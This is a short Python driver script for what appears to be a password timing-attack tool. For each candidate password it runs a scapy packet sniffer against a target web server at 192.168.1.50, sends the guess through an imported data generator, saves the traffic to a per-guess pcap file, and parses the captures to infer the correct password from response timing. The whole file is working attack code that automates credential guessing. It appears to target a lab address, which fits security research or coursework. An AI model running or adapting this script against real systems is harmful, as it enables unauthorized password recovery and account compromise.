import threading

from scapy.all import *

from TimmingAttack import dataGenerator
from TimmingAttack.pcapParser import parser
from TimmingAttack.sniffer import *

def passGenerator():
    return [''.join(i) for i in itertools.product(alphabet, repeat=1)]


alphabet = ['bYrShLk3O3i2Q5gX89sbt23stqDaU', 'bYrShLk3O3i2Q5g','a']  # string.ascii_lowercase  # + string.digits + string.ascii_uppercase


if __name__ == "__main__":
    generated_passwords = passGenerator()

    for guess in generated_passwords:
        sniffer = Sniffer('eth0', 'host 192.168.1.50 and tcp port 80',120)
        sniffer.start()
        sleep(1)
        generator = threading.Thread(target=dataGenerator.generateData, args=(guess,))

        generator.start()
        generator.join()

        sniffer.stop()

        pkt = sniffer.pcap()
        sniffer.reset()

        wrpcap('pcaps/' + guess + '.pcap', pkt)
    parser()
